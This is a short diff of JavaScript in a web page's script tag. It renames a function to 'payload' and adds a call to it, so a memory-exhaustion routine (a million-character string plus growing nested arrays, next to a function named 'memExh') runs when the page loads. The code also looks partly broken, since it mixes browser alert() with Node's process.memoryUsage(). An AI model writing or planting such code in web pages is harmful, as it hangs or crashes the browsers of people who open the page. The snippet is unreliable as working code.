@@ -28,7 +28,7 @@ function memExh() {
     }
 }
 
-function unkown() {
+function payload() {
     let largeString = "A".repeat(1000000); // 1 million A's
     let nestedArray = [];
     let obj = {};
@@ -48,7 +48,8 @@ function unkown() {
         if (nestedArray.length > 1000) {
             nestedArray = []; // Clear nested arrays to exhaust memory
         }
- 
+    }
+ payload()
  alert("Memory usage after:", process.memoryUsage().heapUsed);
 
 </script>
